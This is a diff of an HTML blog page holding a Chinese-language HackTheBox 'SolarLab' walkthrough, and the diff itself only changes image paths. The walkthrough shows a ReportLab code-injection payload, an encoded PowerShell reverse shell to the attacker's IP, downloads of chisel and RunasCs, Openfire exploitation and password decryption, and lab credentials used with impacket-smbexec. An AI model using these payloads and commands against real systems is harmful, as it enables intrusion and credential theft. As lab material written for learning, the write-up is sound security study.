@@ -146,61 +146,61 @@ namp1234567891011121314151617181920212223242526nmap -A -p- -v -T4 solarlab.htbNm
 
 <p>80正常访问，6791跳转到report.solarlab.htb:6791，添加hosts</p>
 <p>445 SMB</p>
-<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/image-20240723143120987.png" alt="image-20240723143120987"></p>
+<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240723143120987.png" alt="image-20240723143120987"></p>
 <p>details-file.xlsx</p>
-<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/image-20240723143222270.png" alt="image-20240723143222270"></p>
+<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240723143222270.png" alt="image-20240723143222270"></p>
 <h3 id="gobuster"><a href="#gobuster" class="headerlink" title="gobuster"></a>gobuster</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gobuster dns -d solarlab.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 100</span><br><span class="line">Nothing</span><br></pre></td></tr></table></figure>
 
 <h3 id="dirsearch"><a href="#dirsearch" class="headerlink" title="dirsearch"></a>dirsearch</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u http://solarlab.htb/</span><br><span class="line">Nothing</span><br><span class="line">dirsearch -u http://report.solarlab.htb:6791/</span><br><span class="line">Nothing</span><br></pre></td></tr></table></figure>
 
 <p>solarlab.htb</p>
-<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/image-20240723130845288.png" alt="image-20240723130845288"></p>
+<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240723130845288.png" alt="image-20240723130845288"></p>
 <p>report.solarlab.htb:6791</p>
-<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/image-20240723130906563.png" alt="image-20240723130906563"></p>
+<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240723130906563.png" alt="image-20240723130906563"></p>
 <p>通过SMB获取的xlsx数据爆破</p>
-<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/image-20240723144553010.png" alt="image-20240723144553010"></p>
-<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/image-20240723144522690.png" alt="image-20240723144522690"></p>
+<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240723144553010.png" alt="image-20240723144553010"></p>
+<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240723144522690.png" alt="image-20240723144522690"></p>
 <p>没有爆破出来，看网上wp是 BlakeB:ThisCanB3typedeasily1@ (缩写)</p>
-<h2 id="Shell"><a href="#Shell" class="headerlink" title="Shell"></a>Shell</h2><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/image-20240723150029165.png" alt="image-20240723150029165"></p>
+<h2 id="Shell"><a href="#Shell" class="headerlink" title="Shell"></a>Shell</h2><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240723150029165.png" alt="image-20240723150029165"></p>
 <p>有四个功能，都能生成 PDF，搜索相关漏洞</p>
-<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/image-20240723145839535.png" alt="image-20240723145839535"></p>
-<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/image-20240723150617112.png" alt="image-20240723150617112"></p>
+<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240723145839535.png" alt="image-20240723145839535"></p>
+<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240723150617112.png" alt="image-20240723150617112"></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;para&gt;&lt;font color=&quot;[[[getattr(pow, Word(&#x27;__globals__&#x27;))[&#x27;os&#x27;].system(&#x27;curl http://10.10.16.30&#x27;) for Word in [ orgTypeFun( &#x27;Word&#x27;, (str,), &#123; &#x27;mutated&#x27;: 1, &#x27;startswith&#x27;: lambda self, x: 1 == 0, &#x27;__eq__&#x27;: lambda self, x: self.mutate() and self.mutated &lt; 0 and str(self) == x, &#x27;mutate&#x27;: lambda self: &#123; setattr(self, &#x27;mutated&#x27;, self.mutated - 1) &#125;, &#x27;__hash__&#x27;: lambda self: hash(str(self)), &#125;, ) ] ] for orgTypeFun in [type(type(1))] for none in [[].append(1)]]] and &#x27;red&#x27;&quot;&gt;</span><br><span class="line">                exploit</span><br><span class="line">&lt;/font&gt;&lt;/para&gt;</span><br></pre></td></tr></table></figure>
 
 <p>测试</p>
-<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/image-20240723155557565.png" alt="image-20240723155557565"></p>
+<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240723155557565.png" alt="image-20240723155557565"></p>
 <p>反弹shell，工具生成powershell</p>
-<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/image-20240723160458541.png" alt="image-20240723160458541"></p>
+<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240723160458541.png" alt="image-20240723160458541"></p>
 <p>User flag: C:\Users\blake\Desktop\user.txt</p>
-<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/image-20240731164556823.png" alt="image-20240731164556823"></p>
+<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240731164556823.png" alt="image-20240731164556823"></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">blakeb:ThisCanB3typedeasily1@ </span><br><span class="line">alexanderk:HotP!fireguard </span><br><span class="line">claudias:007poiuytrewq</span><br></pre></td></tr></table></figure>
 
 <p>C:Users 下发现了 openfire</p>
-<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/image-20240801125828555.png" alt="image-20240801125828555"></p>
-<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/image-20240731164758899.png" alt="image-20240731164758899"></p>
-<h2 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h2><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/image-20240731171843212.png" alt="image-20240731171843212"></p>
+<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240801125828555.png" alt="image-20240801125828555"></p>
+<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240731164758899.png" alt="image-20240731164758899"></p>
+<h2 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h2><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240731171843212.png" alt="image-20240731171843212"></p>
 <p>传 chisel.exe</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">kali</span></span><br><span class="line">python3 -m http.server</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">靶机</span></span><br><span class="line">Invoke-WebRequest -Uri &quot;http://10.10.16.30/chisel.exe&quot; -OutFile &quot;C:\Users\blake\Documents\chisel.exe&quot;</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/image-20240801103203530.png" alt="image-20240801103203530"></p>
+<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240801103203530.png" alt="image-20240801103203530"></p>
 <h3 id="chisel"><a href="#chisel" class="headerlink" title="chisel"></a>chisel</h3><p>反向代理</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./chisel server -p 12345 --reverse --socks5					# kali</span><br><span class="line">./chisel.exe client 10.10.16.30:12345 R:9090:127.0.0.1:9090	# 靶机</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/image-20240801111454668.png" alt="image-20240801111454668"></p>
+<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240801111454668.png" alt="image-20240801111454668"></p>
 <p>google search</p>
-<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/image-20240801111647520.png" alt="image-20240801111647520"></p>
+<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240801111647520.png" alt="image-20240801111647520"></p>
 <p>找到一个身份验证绕过的，利用</p>
-<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/image-20240801111924887.png" alt="image-20240801111924887"></p>
-<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/image-20240801112541646.png" alt="image-20240801112541646"></p>
+<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240801111924887.png" alt="image-20240801111924887"></p>
+<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240801112541646.png" alt="image-20240801112541646"></p>
 <p>继续利用CVE</p>
-<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/image-20240801112526895.png" alt="image-20240801112526895"></p>
-<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/image-20240801112611649.png" alt="image-20240801112611649"></p>
+<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240801112526895.png" alt="image-20240801112526895"></p>
+<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240801112611649.png" alt="image-20240801112611649"></p>
 <p>切换到 system command 就可以RCE了</p>
-<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/image-20240801112916526.png" alt="image-20240801112916526"></p>
+<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240801112916526.png" alt="image-20240801112916526"></p>
 <p>反弹shell，工具生成</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4AMwAwACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==</span><br><span class="line"></span><br><span class="line">nc -lvnp 4444</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/image-20240801113437327.png" alt="image-20240801113437327"></p>
+<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240801113437327.png" alt="image-20240801113437327"></p>
 <h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>embedded-db，有数据库先看，C:\Program Files\Openfire\embedded-db\openfire.script</p>
 <p>从OFUSER表结构来看，有明文密码，也有加密密码</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CREATE MEMORY TABLE PUBLIC.OFUSER(USERNAME VARCHAR(64) NOT NULL,STOREDKEY VARCHAR(32),SERVERKEY VARCHAR(32),SALT VARCHAR(32),ITERATIONS INTEGER,PLAINPASSWORD VARCHAR(32),ENCRYPTEDPASSWORD VARCHAR(255),NAME VARCHAR(100),EMAIL VARCHAR(100),CREATIONDATE VARCHAR(15) NOT NULL,MODIFICATIONDATE VARCHAR(15) NOT NULL,CONSTRAINT OFUSER_PK PRIMARY KEY(USERNAME))</span><br></pre></td></tr></table></figure>
@@ -209,11 +209,11 @@ namp1234567891011121314151617181920212223242526nmap -A -p- -v -T4 solarlab.htbNm
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO OFUSER VALUES(&#x27;admin&#x27;,&#x27;gjMoswpK+HakPdvLIvp6eLKlYh0=&#x27;,&#x27;9MwNQcJ9bF4YeyZDdns5gvXp620=&#x27;,&#x27;yidQk5Skw11QJWTBAloAb28lYHftqa0x&#x27;,4096,NULL,&#x27;becb0c67cfec25aa266ae077e18177c5c3308e2255db062e4f0b77c577e159a11a94016d57ac62d4e89b2856b0289b365f3069802e59d442&#x27;,&#x27;Administrator&#x27;,&#x27;admin@solarlab.htb&#x27;,&#x27;001700223740785&#x27;,&#x27;0&#x27;)</span><br></pre></td></tr></table></figure>
 
 <p>google search，找解密脚本</p>
-<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/image-20240801114349067.png" alt="image-20240801114349067"></p>
+<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240801114349067.png" alt="image-20240801114349067"></p>
 <p>还需要一个key</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO OFPROPERTY VALUES(&#x27;passwordKey&#x27;,&#x27;hGXiFzsKaAeYLjn&#x27;,0,NULL)</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/image-20240801120851215.png" alt="image-20240801120851215"></p>
+<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240801120851215.png" alt="image-20240801120851215"></p>
 <h3 id="impacket-smbexec"><a href="#impacket-smbexec" class="headerlink" title="impacket-smbexec"></a>impacket-smbexec</h3><p>连接，不能使用 cd</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">impacket-smbexec administrator:&#x27;ThisPasswordShouldDo!@&#x27;@solarlab.htb</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">[-] You can<span class="string">&#x27;t CD under SMBEXEC. Use full paths.</span></span></span><br><span class="line">type C:\Users\Administrator\Desktop\root.txt</span><br></pre></td></tr></table></figure>
 
@@ -223,7 +223,7 @@ namp1234567891011121314151617181920212223242526nmap -A -p- -v -T4 solarlab.htbNm
 <h3 id="RunasCS"><a href="#RunasCS" class="headerlink" title="RunasCS"></a>RunasCS</h3><p>通过powershell传到靶机上</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Invoke-WebRequest -Uri http://10.10.16.30/RunasCs.exe -OutFile C:\Users\blake\Documents\RunasCs.exe</span><br><span class="line"></span><br><span class="line">./RunasCs.exe administrator ThisPasswordShouldDo!@ powershell -r 10.10.16.30:6666</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/image-20240801125558440.png" alt="image-20240801125558440"></p>
+<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240801125558440.png" alt="image-20240801125558440"></p>
 
 	  <!--
 <div class="article-footer-copyright">
